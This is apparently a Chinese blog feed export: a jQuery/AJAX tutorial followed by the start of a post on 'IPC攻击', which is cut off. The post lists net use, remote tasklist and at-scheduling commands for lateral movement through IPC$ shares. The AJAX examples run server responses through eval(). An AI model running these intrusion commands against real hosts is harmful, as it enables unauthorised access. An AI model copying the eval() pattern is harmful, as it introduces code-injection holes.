class="string">&quot;#test&quot;</span>).text()  <span class="comment">//获得id元素text内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).html()  <span class="comment">//获得id元素html内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).val()   <span class="comment">////获得id元素value内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).attr(<span class="string">&quot;href&quot;</span>) <span class="comment">//获得id元素href属性值</span></span><br></pre></td></tr></table></figure><h3 id="设置内容-text-、html-以及-val"><a href="#设置内容-text-、html-以及-val" class="headerlink" title="设置内容 - text()、html() 以及 val()"></a>设置内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test2&quot;</span>).html(<span class="string">&quot;&lt;b&gt;Hello world!&lt;/b&gt;&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test3&quot;</span>).val(<span class="string">&quot;value666&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;http://baidu.com&quot;</span>);<span class="comment">//可设置多个值，逗号分开 </span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="function"><span class="keyword">function</span>(<span class="params">i,origText</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;旧 html: &quot;</span> + origText + <span class="string">&quot; 新 html&quot;</span>;</span><br><span class="line">&#125;);      <span class="comment">//回调函数传参旧值+新值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">i,origValue</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> origValue + <span class="string">&quot;/jquery&quot;</span>; </span><br><span class="line">  &#125;);     <span class="comment">//回调函数传参旧值+新值</span></span><br></pre></td></tr></table></figure><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).append(<span class="string">&quot;追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).prepend(<span class="string">&quot;在开头追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;body&quot;</span>).append(txt1,txt2,txt3); <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(<span class="string">&quot;在后面添加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).before(<span class="string">&quot;在前面添加文本&quot;</span>); </span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(txt1,txt2,txt3);  <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).remove();   <span class="comment">//删除div1整个元素</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).empty();    <span class="comment">//删除div1下属的子元素</span></span><br></pre></td></tr></table></figure><h2 id="jQuery-AJAX-常用方法"><a href="#jQuery-AJAX-常用方法" class="headerlink" title="jQuery AJAX 常用方法"></a>jQuery AJAX 常用方法</h2><h3 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax()"></a>$.ajax()</h3><p>JQuery原生的ajax编写格式，具有多个参数来设置相关的操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="attr">url</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//异步请求访问链接</span></span><br><span class="line"><span class="attr">data</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//提交的数据，将自动转换为请求字符串格式</span></span><br><span class="line"><span class="attr">dataType</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//json,xml,text,html等</span></span><br><span class="line"><span class="attr">type</span>:<span class="string">&quot;post&quot;</span>,<span class="comment">//默认值: &quot;GET&quot;。请求方式 (&quot;POST&quot; 或 &quot;GET&quot;)</span></span><br><span class="line"><span class="attr">async</span>:<span class="literal">true</span>,<span class="comment">//默认为true，即默认为异步请求，否则为同步请求</span></span><br><span class="line"><span class="attr">contentType</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,<span class="comment">//默认值为application/x-www-form-urlencoded，即表单提交的方式，可以切换为&quot;application/json&quot;</span></span><br><span class="line"><span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="comment">//当异步请求完成时所执行的回调函数</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="get-和-post-方法"><a href="#get-和-post-方法" class="headerlink" title="get() 和 post() 方法"></a>get() 和 post() 方法</h3><p>$.get(<em>URL</em>,<em>callback</em>);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&quot;http://www.b.com/test.php?url=11&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;数据:&quot;</span> + data + <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>$.post(URL,data,callback);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.post(<span class="string">&quot;http://www.b.com/post.php&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;dome&quot;</span>,</span><br><span class="line">        <span class="attr">key</span>:<span class="string">&quot;ccc&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;数据:&quot;</span> + data + <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="getScript"><a href="#getScript" class="headerlink" title="$.getScript()"></a>$.getScript()</h3><p>使用 AJAX 的 HTTP GET 请求获取和执行 JavaScrip,可选参数url,success(response,status)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getScript(<span class="string">&quot;demo_ajax_script.js&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load()"></a>load()</h3><p>把test.txt内容加载到指定的 <div> 元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(url,data,callback);  </span><br><span class="line"><span class="comment">//callback函数参数1：responseTxt(结果) 参数2：statusTXT(状态) xhr：xhr 对象</span></span><br><span class="line"><span class="comment">// eg : function(responseTxt,statusTxt,xhr)</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt&quot;</span>);   <span class="comment">//内容加载到指定的 &lt;div&gt; 元素中</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt #p1&quot;</span>); <span class="comment">//test.txt文件中 id=&quot;p1&quot; 的元素的内容，加载到指定的 &lt;div&gt; 元素中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON()"></a>$.getJSON()</h3><p>使用 AJAX 的 HTTP GET 请求获取 JSON 数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">&quot;https://www.b.com/jsonp.php?jsoncallback=?&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    $(<span class="string">&#x27;#divCustomers&#x27;</span>).html(html); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><p>XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。</p><h3 id="创建XMLHttprequest"><a href="#创建XMLHttprequest" class="headerlink" title="创建XMLHttprequest"></a>创建XMLHttprequest</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest()   <span class="comment">//现代浏览器</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)   <span class="comment">//IE 5.6及古老版本</span></span><br></pre></td></tr></table></figure><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/try/ajax/demo_get2.php?fname=Henry&amp;lname=Ford&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><h3 id="Post-请求"><a href="#Post-请求" class="headerlink" title="Post 请求"></a>Post 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;/try/ajax/demo.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.send(<span class="string">&quot;fname=Henry&amp;lname=Ford&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="获取响应数据"><a href="#获取响应数据" class="headerlink" title="获取响应数据"></a>获取响应数据</h3><p>readyState属性值</p><table><thead><tr><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>未初始化。表示对象已经建立，但是尚未初始化，尚未调用 open() 方法</td></tr><tr><td>1</td><td>初始化。表示对象已经建立，尚未调用 send() 方法</td></tr><tr><td>2</td><td>发送数据。表示 send() 方法已经调用，但是当前的状态及 HTTP 头未知</td></tr><tr><td>3</td><td>数据传送中。已经接收部分数据，因为响应及 HTTP 头不安全，这时通过 responseBody 和 responseText 获取部分数据会出现错误</td></tr><tr><td>4</td><td>完成。数据接收完毕，此时可以通过 responseBody 和 responseText 获取完整的响应数据</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;myDiv&quot;</span>).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure><h3 id="获取-HTML-字符串"><a href="#获取-HTML-字符串" class="headerlink" title="获取 HTML 字符串"></a>获取 HTML 字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">document</span>.getElementById(<span class="string">&quot;grid&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        o.innerHTML = xhr.responseText;  <span class="comment">//直接插入到页面中</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JavaScript-脚本"><a href="#获取-JavaScript-脚本" class="headerlink" title="获取 JavaScript 脚本"></a>获取 JavaScript 脚本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span> + <span class="string">&quot;()&quot;</span>);  <span class="comment">//用eval()把字符串转换为脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o);  <span class="comment">//返回客户端当前信息</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JSON-数据"><a href="#获取-JSON-数据" class="headerlink" title="获取 JSON 数据"></a>获取 JSON 数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span>);  <span class="comment">//调用eval()把字符串转换为本地脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(info);  <span class="comment">//显示JSON对象字符串</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o.user);  <span class="comment">//读取对象属性值，返回字符串“css8”</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取纯文本"><a href="#获取纯文本" class="headerlink" title="获取纯文本"></a>获取纯文本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.txt&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span><br><span class="line">xhr.nreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState函数</span></span><br><span class="line">        <span class="keyword">if</span> (xhr.status == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span><br><span class="line">            <span class="keyword">var</span> info = xhr.responseText;</span><br><span class="line">            <span class="keyword">if</span> (info == <span class="string">&quot;true&quot;</span>) <span class="built_in">console</span>.log(<span class="string">&quot;文本信息传输完整&quot;</span>);  <span class="comment">//检测信息是否完整</span></span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">&quot;文本信息可能存在丢失&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send();  <span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure><h3 id="获取和设置头部消息"><a href="#获取和设置头部消息" class="headerlink" title="获取和设置头部消息"></a>获取和设置头部消息</h3><p>设置获取 HTTP 响应的所有头部消息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;server.txt&quot;</span>;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.getAllResponseHeaders());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>设置HTTP响应的头部信息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.setResponseHeader(<span class="string">&quot;Header-name&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">xhr.setResponseHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="http://c.biancheng.net/view/5995.html">http://c.biancheng.net/view/5995.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPC攻击</title>
      <link href="/posts/8221/"/>
      <url>/posts/8221/</url>
      
        <content type="html"><![CDATA[<p>概述:</p><p>IPC共享“命令管道”的资源，是为了实现进程间通信而开放的命名管道<br>IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用<br>通过ipc$，与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可<br>以在目标机器中执行命令，获取目标机中的信息<br>常用于横向渗透,权限维持.</p><p>建立ipc$的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP地址\ipc<span class="variable">$</span> “密码” /user:“用户名” //建立连接</span><br><span class="line">net use //查看当前连接</span><br></pre></td></tr></table></figure><p>ipc$利用条件</p><p>管理员开启了默认共享</p><p>139、445端口开启</p><p><strong>IPC攻击利用</strong></p><p>1.用 Windows 自带的工具获取远程主机信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 目标IP地址 /U 用户名 /P 密码  <span class="comment">#查看目标主机运行的进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\目标iP地址\主机盘符               <span class="comment">#查看目标主机的目录树</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.利用计划任务进行攻击</p><ul><li>AT 命令 (适用windows2003 xp 之前)</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span></span><br><span 